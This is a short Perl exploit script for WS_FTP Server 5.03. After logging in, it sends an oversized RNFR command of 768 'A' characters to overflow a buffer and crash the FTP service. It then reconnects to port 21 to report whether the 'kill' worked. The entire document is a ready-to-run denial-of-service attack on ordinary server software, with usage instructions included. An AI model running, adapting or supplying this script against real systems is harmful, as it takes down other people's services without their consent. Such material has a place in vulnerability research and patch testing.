#===== Start WS_FTP_Overflow.pl =====
#
# Usage: WS_FTP_Overflow.pl <ip> <ftp user> <ftp pass>
#        WS_FTP_Overflow.pl 127.0.0.1 hello moto
#
# WS_FTP Server Version 5.03, 2004.10.14
#
# Download:
# http://www.ipswitch.com/
#
#####################################################

use IO::Socket;
use strict;

my($socket) = "";

if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                                    PeerPort => "21",
                                    Proto    => "TCP"))
{
        print "Attempting to kill WS_FTP Server service at $ARGV[0]:21...";

        sleep(1);

        print $socket "USER $ARGV[1]\r\n";

        sleep(1);

        print $socket "PASS $ARGV[2]\r\n";

        sleep(1);

        print $socket "PORT 127,0,0,1,18,12\r\n";

        sleep(1);

        print $socket "RNFR " . "A" x 768 . "\r\n";

        close($socket);

        sleep(1);

        if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                                            PeerPort => "21",
                                            Proto    => "TCP"))
        {
                close($socket);

                print "failed!\n";
        }
        else
        {
                print "successful!\n";
        }
}
else
{
        print "Cannot connect to $ARGV[0]:21\n";
}
#===== End WS_FTP_Overflow.pl =====
